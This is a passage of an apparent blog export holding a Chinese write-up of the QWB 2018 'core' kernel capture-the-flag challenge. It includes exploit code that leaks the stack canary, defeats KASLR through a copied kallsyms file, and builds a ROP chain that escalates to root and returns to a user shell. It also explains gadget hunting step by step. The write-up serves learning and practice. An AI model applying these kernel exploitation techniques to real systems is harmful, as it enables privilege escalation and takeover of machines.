vmlinux_base=commit_creds-0x9c8e0;\n    vmoffset=vmlinux_base-raw_vmlinux_base;\n    printf(\"\\033[34m\\033[1m[*] This is real vmlinux base :\\033[0m%llx\\n\",vmlinux_base);\n\n    // leak canary\n    edit_off(64);\n    coreRead(buf);\n    \n    size_t canary=((size_t*)buf)[0];\n    printf(\"\\033[35m\\033[1m[*] The value of canary is the first 8 bytes: \\033[0m%#llx\\n\", canary);\n\n    // make rop chain\n    size_t rop_chain[0x100];\n    int i=0;\n    // padding and canary\n    for(; i<10; i++)\n\t\trop_chain[i] = canary;\n    \n    // commit_creds(prepare_kernel_cred(0)); \n    // rdi=0\n    rop_chain[i++]=pop_rdi_ret+vmoffset;\n    rop_chain[i++]=0;\n    // prepare_kernel_cred(0);\n    rop_chain[i++]=prepare_kernel_cred;\n    // rdi=rax; call rdx --> pop rcx(move the next code of mov) --> commit_creds(prepare_kernel_cred(0));\n    rop_chain[i++]=pop_rdx_ret+vmoffset;\n    rop_chain[i++]=pop_rcx_ret+vmoffset;\n    rop_chain[i++]=mov_rdi_rax_call_rdx+vmoffset;\n    rop_chain[i++]=commit_creds;\n    // ret2usr swags; iretq\n    rop_chain[i++]=swapgs_popfq_ret+vmoffset;\n    rop_chain[i++]=0;   // popfq\n    rop_chain[i++]=iretq_ret+vmoffset;\n    // after the iretq: return address, user cs, user rflags, user sp, user ss\n    rop_chain[i++]=(size_t)shell;\n    rop_chain[i++]=user_cs;\n    rop_chain[i++]=user_rflags;\n    rop_chain[i++]=user_sp;\n    rop_chain[i++]=user_ss;\n\n\tprintf(\"\\033[34m\\033[1m[*] Our rop chain looks like: \\033[0m\\n\");\n\tprint_binary((char*)rop_chain, 0x100);\n\n\twrite(fd, (char*)rop_chain, 0x800);\n    // use negative number overflow\n\tcoreCopyFunc(0xffffffffffff0100);\n    return 0;\n\n}\n```\n\n\n\n\n\n","slug":"QWB-core","published":1,"updated":"2023-03-15T09:45:14.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafj001x5oudfamj7h37","content":"<p>强网杯2018 core，从0到1的kernel。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>首先分析启动脚本<code>start.sh</code></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qemu-system-x86_64 \\\t<span class=\"comment\"># x86_64架构</span></span><br><span class=\"line\">-m 64M \\\t<span class=\"comment\"># 分配64M内存</span></span><br><span class=\"line\">-kernel ./bzImage \\\t\t<span class=\"comment\"># 使用bzImage作为内存镜像(kernel)\t</span></span><br><span class=\"line\">-initrd  ./core.cpio \\\t<span class=\"comment\"># 使用core.cpio作为磁盘镜像(文件系统)</span></span><br><span class=\"line\">-append <span class=\"string\">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \\ <span class=\"comment\"># 设置root，指定终端为tty50，开启kaslr</span></span><br><span class=\"line\">-s  \\\t<span class=\"comment\"># 启动后qemu不立即运行guest，而是等待主机gdb发起连接，使用1234端口</span></span><br><span class=\"line\">-netdev user,<span class=\"built_in\">id</span>=t0, -device e1000,netdev=t0,<span class=\"built_in\">id</span>=nic0 \\     <span class=\"comment\"># 网络配置</span></span><br><span class=\"line\">-nographic  \\\t\t<span class=\"comment\"># 非图形化启动，使用命令行</span></span><br></pre></td></tr></table></figure>\n\n<p>解压``core.cpio<code>，查看</code>init`文件（初始化的过程）：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\"># 挂载文件系统</span></span><br><span class=\"line\">mount -t proc proc /proc</span><br><span class=\"line\">mount -t sysfs sysfs /sys</span><br><span class=\"line\">mount -t devtmpfs none /dev</span><br><span class=\"line\">/sbin/mdev -s</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /dev/pts</span><br><span class=\"line\">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 666 /dev/ptmx</span><br><span class=\"line\"><span class=\"comment\"># 复制了一份符号表</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class=\"line\"><span class=\"comment\"># 网络配置</span></span><br><span class=\"line\">ifconfig eth0 up</span><br><span class=\"line\">udhcpc -i eth0</span><br><span class=\"line\">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class=\"line\">route add default gw 10.0.2.2 </span><br><span class=\"line\"><span class=\"comment\"># 加载了core.ko模块</span></span><br><span class=\"line\">insmod /core.ko</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#定时关机</span></span><br><span class=\"line\">poweroff -d 120 -f &amp;</span><br><span class=\"line\">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;sh end!\\n&#x27;</span></span><br><span class=\"line\">umount /proc</span><br><span class=\"line\">umount /sys</span><br><span class=\"line\"></span><br><span class=\"line\">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>\n\n<p>checksec一下<code>core.ko</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnTrain/StrongWeb2018core/core_give/give_to_player/core/core.ko&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br></pre></td></tr></table></figure>\n\n<p>扔到IDA逆一下，<code>init_module</code>是这个模块的初始化工作：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">init_module</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  core_proc = proc_create(<span class=\"string\">&quot;core&quot;</span>, <span class=\"number\">0666LL</span>, <span class=\"number\">0LL</span>, &amp;core_fops);</span><br><span class=\"line\">  printk(&amp;unk_2DE);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个模块一开始就会创建一个自己的进程，使用的是<code>core_fops</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">struct</span> proc_dir_entry *<span class=\"title function_\">proc_create</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *name, <span class=\"type\">mode_t</span> mode, <span class=\"keyword\">struct</span> proc_dir_entry *parent, <span class=\"type\">const</span> <span class=\"keyword\">struct</span> file_operations *proc_fops)</span>;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>name就是要创建的文件名。</li>\n<li><strong>mode是文件的访问权限，以UGO的模式表示。</strong><ul>\n<li>UGO：使用三组字符串(或数字)表示属用户，属组和其他用户的rwx权限：r=4,w=2,x=1(因此777就是rwxrwxrwx)</li>\n</ul>\n</li>\n<li><strong>parent与proc_mkdir中的parent类似。也是父文件夹的proc_dir_entry对象</strong>。</li>\n<li>proc_fops就是该文件的操作函数了。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data:0000000000000420 40 05 00 00 00 00 00 00       core_fops dq offset __this_module       ; DATA XREF: init_module↑o</span><br><span class=\"line\">.data:0000000000000428 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000430 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000438 11 00 00 00 00 00 00 00       dq offset core_write</span><br><span class=\"line\">.data:0000000000000440 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000448 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000450 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000458 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000460 00 00 00 00 00 00 00 00       dq 0</span><br><span class=\"line\">.data:0000000000000468 5F 01 00 00 00 00 00 00       dq offset core_ioctl</span><br></pre></td></tr></table></figure>\n\n<p><code>core_fops</code>中有<code>core_write</code>、<code>core_ioctl</code>和<code>core_release</code>三个函数。</p>\n<p><code>core_release</code>仅输出一段字符串，没有利用价值。</p>\n<p><code>core_write</code>会将一段用户空间的数据(最多0x800byte)，写入<code>bss</code>的<code>name</code>处。</p>\n<p><code>core_ioctl</code>会根据请求码选择不同的操作，可以调用<code>core_read</code>将栈上偏移<code>off</code>的数据写入用户空间，可以设置<code>off</code>，也可以调用<code>core_copy_func</code>。</p>\n<p>在<code>core_copy_func</code>会将<code>bss</code>中的<code>name</code>复制到栈上，其中有一个<strong>整数溢出</strong>，可以通过<strong>负数</strong>绕过检查并实现栈溢出。</p>\n<p>补充一下相关的内容：<code>core_fops</code>是一个<code>file_operations</code>的结构体，通过覆盖其中的内容来修改用户层调用时，该内核模块中执行的函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file_operations</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">module</span> *<span class=\"title\">owner</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">loff_t</span> (*llseek) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span>, <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*read) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">char</span> __user *, <span class=\"type\">size_t</span>, <span class=\"type\">loff_t</span> *);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*write) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">const</span> <span class=\"type\">char</span> __user *, <span class=\"type\">size_t</span>, <span class=\"type\">loff_t</span> *);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*read_iter) (<span class=\"keyword\">struct</span> kiocb *, <span class=\"keyword\">struct</span> iov_iter *);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*write_iter) (<span class=\"keyword\">struct</span> kiocb *, <span class=\"keyword\">struct</span> iov_iter *);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*iopoll)(<span class=\"keyword\">struct</span> kiocb *kiocb, <span class=\"keyword\">struct</span> io_comp_batch *,</span><br><span class=\"line\">\t\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> flags);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*iterate) (<span class=\"keyword\">struct</span> file *, <span class=\"keyword\">struct</span> dir_context *);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*iterate_shared) (<span class=\"keyword\">struct</span> file *, <span class=\"keyword\">struct</span> dir_context *);</span><br><span class=\"line\">\t<span class=\"type\">__poll_t</span> (*poll) (<span class=\"keyword\">struct</span> file *, <span class=\"keyword\">struct</span> poll_table_struct *);</span><br><span class=\"line\">\t<span class=\"type\">long</span> (*unlocked_ioctl) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">unsigned</span> <span class=\"type\">int</span>, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>);</span><br><span class=\"line\">\t<span class=\"type\">long</span> (*compat_ioctl) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">unsigned</span> <span class=\"type\">int</span>, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*mmap) (<span class=\"keyword\">struct</span> file *, <span class=\"keyword\">struct</span> vm_area_struct *);</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> mmap_supported_flags;</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*open) (<span class=\"keyword\">struct</span> inode *, <span class=\"keyword\">struct</span> file *);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*flush) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">fl_owner_t</span> id);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*release) (<span class=\"keyword\">struct</span> inode *, <span class=\"keyword\">struct</span> file *);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*fsync) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span>, <span class=\"type\">loff_t</span>, <span class=\"type\">int</span> datasync);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*fasync) (<span class=\"type\">int</span>, <span class=\"keyword\">struct</span> file *, <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*lock) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">int</span>, <span class=\"keyword\">struct</span> file_lock *);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*sendpage) (<span class=\"keyword\">struct</span> file *, <span class=\"keyword\">struct</span> page *, <span class=\"type\">int</span>, <span class=\"type\">size_t</span>, <span class=\"type\">loff_t</span> *, <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"title function_\">long</span> <span class=\"params\">(*get_unmapped_area)</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>, <span class=\"type\">unsigned</span> <span class=\"type\">long</span>)</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*check_flags)(<span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*flock) (<span class=\"keyword\">struct</span> file *, <span class=\"type\">int</span>, <span class=\"keyword\">struct</span> file_lock *);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*splice_write)(<span class=\"keyword\">struct</span> pipe_inode_info *, <span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span> *, <span class=\"type\">size_t</span>, <span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*splice_read)(<span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span> *, <span class=\"keyword\">struct</span> pipe_inode_info *, <span class=\"type\">size_t</span>, <span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*setlease)(<span class=\"keyword\">struct</span> file *, <span class=\"type\">long</span>, <span class=\"keyword\">struct</span> file_lock **, <span class=\"type\">void</span> **);</span><br><span class=\"line\">\t<span class=\"type\">long</span> (*fallocate)(<span class=\"keyword\">struct</span> file *file, <span class=\"type\">int</span> mode, <span class=\"type\">loff_t</span> offset,</span><br><span class=\"line\">\t\t\t  <span class=\"type\">loff_t</span> len);</span><br><span class=\"line\">\t<span class=\"type\">void</span> (*show_fdinfo)(<span class=\"keyword\">struct</span> seq_file *m, <span class=\"keyword\">struct</span> file *f);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> CONFIG_MMU</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> (*mmap_capabilities)(<span class=\"keyword\">struct</span> file *);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> (*copy_file_range)(<span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span>, <span class=\"keyword\">struct</span> file *,</span><br><span class=\"line\">\t\t\t<span class=\"type\">loff_t</span>, <span class=\"type\">size_t</span>, <span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">\t<span class=\"type\">loff_t</span> (*remap_file_range)(<span class=\"keyword\">struct</span> file *file_in, <span class=\"type\">loff_t</span> pos_in,</span><br><span class=\"line\">\t\t\t\t   <span class=\"keyword\">struct</span> file *file_out, <span class=\"type\">loff_t</span> pos_out,</span><br><span class=\"line\">\t\t\t\t   <span class=\"type\">loff_t</span> len, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> remap_flags);</span><br><span class=\"line\">\t<span class=\"type\">int</span> (*fadvise)(<span class=\"keyword\">struct</span> file *, <span class=\"type\">loff_t</span>, <span class=\"type\">loff_t</span>, <span class=\"type\">int</span>);</span><br><span class=\"line\">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>\n\n<p>在<code>core_fops</code>中修改了内核中<code>write</code>的指向，在用户层调用<code>write</code>函数最终就会调用到这个内核模块中定义的<code>core_write</code>。</p>\n<p>经过上面的分析，我们可以有一个大概的思路：</p>\n<p><code>查找关键函数地址计算偏移 --&gt; 利用core_read泄露Canary--&gt; 在name中构建ROP chain --&gt; 利用core_copy_func的栈溢出执行ROP链 --&gt; 获取root权限并返回用户态获取root shell</code></p>\n<h3 id=\"坑\"><a href=\"#坑\" class=\"headerlink\" title=\"坑\"></a>坑</h3><h4 id=\"对抗KASLR\"><a href=\"#对抗KASLR\" class=\"headerlink\" title=\"对抗KASLR\"></a>对抗KASLR</h4><p>在<code>start.sh</code>中就可以看到，这道题开启了<code>KASLR</code>保护，这和<code>ASLR</code>是类似的，都是一种地址随机化技术，我们可以在获取地址后<strong>计算偏移</strong>来绕过。但对于没有相关经验的我来说，怎么计算偏移是一个问题，查阅资料后发现，这需要利用到vmlinux文件。</p>\n<p>在linux系统中，vmlinux（vmlinuz）是一个包含linux kernel的<strong>静态链接的可执行文件</strong>，文件类型可能是linux接受的可执行文件格式之一（ELF、COFF或a.out），vmlinux若要用于调试时则必须要在引导前增加symbol table</p>\n<p><strong>应用场景：</strong></p>\n<ul>\n<li>用于调试，但需要包含调试信息</li>\n<li>编译出来的内核原始文件，可以被用来制作后面zImage，bzImage等启动Image</li>\n<li>UBoot不能直接使用vmlinux</li>\n</ul>\n<p><strong>相关内容：</strong></p>\n<ul>\n<li>vmlinux是ELF文件。是编译出来的最原始的文件</li>\n<li>vmlinuz是被压缩的linux内核，是可以被引导的</li>\n<li>vmlinuz是一个统称。有两种详细的表现形式：zImage和bzImage(big zImage)。</li>\n<li>zImage是vmlinuz经过gzip压缩后的文件，适用于小内核</li>\n<li>bzImage是vmlinuz经过gzip压缩后的文件，适用于大内核</li>\n</ul>\n<p>简单的说，<strong>vmlinux就是一个被压缩的<code>kernel</code>，是一个静态的ELF文件</strong>。我们可以在vmlinux的<code>.text</code>段中查看到这个kernel的<strong>所有函数地址(其基地址为vmlinux的基地址)<strong>，而这些地址都是</strong>静态的</strong>。</p>\n<blockquote>\n<p><strong>无论是找gadget还是找函数地址一定要在对应的vmlinux中找，本地的在kernel用的<code>.cpio</code>中的vmlinux中，远程的在给的vmlinux（可以看作libc）</strong></p>\n</blockquote>\n<p>因此，我们可以通过readelf查找<code>.text</code>段的基地址。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readelf -t vmlinux</span><br></pre></td></tr></table></figure>\n\n<p>可以通过pwntools的ELF模块找到其中的地址，从而算出<strong>函数到基地址的偏移</strong>。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./vmlinux&#x27;</span>)</span><br><span class=\"line\">vmbase=<span class=\"number\">0xffffffff81000000</span></span><br><span class=\"line\">commit_offset=elf.symbols[<span class=\"string\">&#x27;commit_creds&#x27;</span>]-vmbase</span><br><span class=\"line\">prepare_offset=elf.symbols[<span class=\"string\">&#x27;prepare_kernel_cred&#x27;</span>]-vmbase</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;commit_offset: &quot;</span>+<span class=\"built_in\">hex</span>(commit_offset))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;prepare_offset: &quot;</span>+<span class=\"built_in\">hex</span>(prepare_offset))</span><br></pre></td></tr></table></figure>\n\n<p>但这还没有结束，我们需要获取运行中kernel的真实地址，才能计算出内核的基地址。</p>\n<p>在init中有下面的一段，将符号表复制到了<code>/tmp/kallsyms</code>中，通过读取符号表的内容，我们可以获取到<code>commit_creds</code>和<code>prepare_kernel_cred</code>的真实地址。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 复制了一份符号表</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br></pre></td></tr></table></figure>\n\n<p>符号表分为<code>地址、类型、函数名</code>三列，读取每一项后比对函数名就可以找到真实地址，这里用了<code>fscanf</code>函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">fscanf</span><span class=\"params\">(FILE *stream, <span class=\"type\">const</span> <span class=\"type\">char</span> *format, ...)</span></span><br><span class=\"line\"><span class=\"comment\">//返回值为读取的个数</span></span><br><span class=\"line\"><span class=\"comment\">//读取地址</span></span><br><span class=\"line\"><span class=\"title function_\">fscanf</span><span class=\"params\">(symbols_table, <span class=\"string\">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>读到真实地址后，用<code>真实地址-偏移</code>即可得到运行中kernel的基地址，借此我们可以计算出<strong>两个基地址之间的偏移</strong>。</p>\n<h4 id=\"获取gadget\"><a href=\"#获取gadget\" class=\"headerlink\" title=\"获取gadget\"></a>获取gadget</h4><p>获取gadget同样需要利用vmlinux，可以直接使用<code>ROPgadget</code>来搜，不过这样分析一次vmlinux的时间挺长的，可以先把所有gadget搜出来，然后再用grep找。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary vmlinux &gt; gadget</span><br><span class=\"line\"><span class=\"built_in\">cat</span> gadget | grep <span class=\"string\">&#x27;...&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>对于找不到的gadget，可以用pwntools</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./vmlinux&quot;</span>)</span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span> <span class=\"comment\"># 记得设置arch，不然找不到</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(elf.search(asm(<span class=\"string\">&#x27;iretq&#x27;</span>)).__next__()))</span><br></pre></td></tr></table></figure>\n\n<p>执行<code>commit_creds(prepare_kernel_cred(0))</code>的时候，因为返回值存在<code>rax</code>，因此我们需要<code>mov rdi, rax ;</code>之后再<code>commit_creds()</code>。</p>\n<p>这里找不到<code>mov rdi, rax ; ret</code>的gadget，因此用<code>mov rdi, rax; call rdx</code>来替代，所以要提前设置好<code>rdx</code>。除此之外，<code>call rdx</code>会将<code>rdx</code><strong>指向指令的下一条指令（地址上）入栈</strong>，这会让rop链断开，因此<code>rdx</code>指向的指令需要把这个入栈的指令除掉，并通过<code>ret</code>接上rop链，这里用的是<code>pop rcx; ret</code>。</p>\n<h4 id=\"返回用户态\"><a href=\"#返回用户态\" class=\"headerlink\" title=\"返回用户态\"></a>返回用户态</h4><p>为了让内核函数执行完成后能够顺利返回用户态，需要在用户态保存一些寄存器的值，这个函数应该首先被执行：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveStatus</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm__(<span class=\"string\">&quot;mov user_cs, cs;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;mov user_ss, ss;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;mov user_sp, rsp;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\">            );</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\033[34m\\033[1m[*] Status has been saved.\\033[0m&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>而在返回用户态时，只需要在栈中构造好保存的用户状态，执行<code>swapg; iretq</code>就能返回用户态。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//最后的栈布局，用于返回用户态</span></span><br><span class=\"line\">↓   swapgs</span><br><span class=\"line\">    